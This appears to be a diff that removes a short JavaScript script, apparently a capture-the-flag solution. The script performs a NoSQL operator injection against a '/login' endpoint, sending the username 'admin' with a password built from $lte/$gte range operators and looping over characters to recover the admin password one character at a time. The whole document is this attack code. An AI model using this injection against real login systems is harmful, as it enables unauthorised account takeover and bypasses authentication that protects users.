@@ -1,8 +1,0 @@
-var base = "congratsyouwin";
-for(var i = 97; i < 127; i++){
-a(base + String.fromCharCode(i), base + String.fromCharCode(i+1))
-}
-
-a = (val, next) => $.ajax({type:"POST", url: "/login", contentType: "application/json", data: JSON.stringify({username: "admin", password: {$lte: next, $gte: val}}), success:(b, c, a, d) => {
-if(b !== "Wrong username or password")console.log(val)
-}})
